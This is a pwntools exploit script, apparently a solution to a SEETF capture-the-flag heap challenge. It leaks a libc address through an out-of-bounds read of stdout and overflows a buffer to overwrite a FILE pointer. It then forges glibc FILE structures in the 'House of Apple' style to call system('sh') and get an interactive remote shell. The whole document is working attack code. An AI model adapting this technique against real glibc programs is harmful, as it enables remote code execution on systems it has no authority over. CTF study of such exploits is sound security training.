from pwn import *
fn = "./chall"
real = True

context.log_level = "debug"
p = remote("win.the.seetf.sg", 2003)

elf = ELF(fn)
libc = ELF("./libc.so.6", checksec=False)
context.binary = elf

sla = lambda x, y: p.sendlineafter(x, y)
sl = lambda x: p.sendline(x)

threshold = 128 * 0x1000
sla(b"What size to allocate?", str(threshold).encode("ascii"))  # trigger mmap()

sla(b"Which file to read?", b"7")  # OOB read of stdout
p.recvuntil(b"@ ")
leak = int(p.recvuntil(b"\n").strip().decode("ascii"), 16)
chunk_ptr = leak
libc_base = leak - 0x10 + threshold + 0x4000
log.info("Libc base: " + hex(libc_base))
log.info("Chunk ptr: " + hex(chunk_ptr))

libc.address = libc_base
stdin = libc.sym["_IO_2_1_stdin_"]

# documentation: xsgetn https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/fileops.c#L1271
write_addr = stdin
write_amt = 0x110  # satisfy: want < (fp->_IO_buf_end - fp->_IO_buf_base)
fs = FileStructure()
fs.read(addr=write_addr, size=write_amt)

payload = bytes(fs)[:0x70]
sla(b"Content: ", payload)  # forge fake file struct

payload = b"A" * 0x100 + p64(chunk_ptr)  # overflow buffers[2] into fp
sla(b"Content: ", payload)

# Credit: https://github.com/RoderickChan/pwncli/blob/3e2ca36ec4c05eaac456f1f70c8a075c1f4d702b/pwncli/utils/io_file.py#L219
fs.flags = unpack(b"  sh", 32)
fs._IO_write_base = 0
fs._IO_write_ptr = 1
fs._lock = stdin-0x10
fs.chain = libc.sym["system"]
fs._codecvt = stdin
fs._wide_data = stdin-0x48
fs.unknown2 = p64(0) * 6  # 0xc0 = _mode
fs.vtable = libc.sym["_IO_wfile_jumps"]

payload = bytes(fs)
payload = payload + (write_amt - len(payload)) * b"\0"
sla(b"Constant!", payload)  # House of Apple payload

p.interactive()